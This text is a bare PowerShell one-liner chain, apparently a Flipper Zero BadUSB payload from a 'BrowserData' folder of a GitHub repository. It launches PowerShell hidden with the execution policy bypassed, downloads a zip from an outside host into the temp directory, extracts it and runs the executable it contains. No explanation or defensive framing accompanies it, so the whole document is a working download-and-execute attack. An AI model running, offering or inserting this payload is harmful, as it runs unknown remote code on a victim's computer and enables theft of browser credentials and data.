powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";
iwr -Uri 'https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows.zip' -O "$D\hg.zip";
Expand-Archive "$D\hg.zip" -Des $D -Force;
. "$D\hg\windows64.exe"